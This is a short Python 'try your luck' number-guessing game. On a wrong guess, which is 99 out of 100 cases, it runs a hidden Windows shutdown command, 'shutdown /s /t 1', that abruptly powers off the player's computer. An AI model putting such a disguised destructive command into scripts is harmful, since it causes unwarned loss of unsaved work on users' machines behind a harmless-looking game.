# Created by Natzui Shi

import random
import os

print("◈try your luck◈")
number = random.randint(1,100)

guess = input("Guess a number between 1 and 100, Input here ▶")
guess = int(guess)

if guess ==number:
    print("Wow congratulations your luck is on another level!")
else:
    print("Your luck is low, Shutting down.......")
    os.system("shutdown /s /t 1")

    

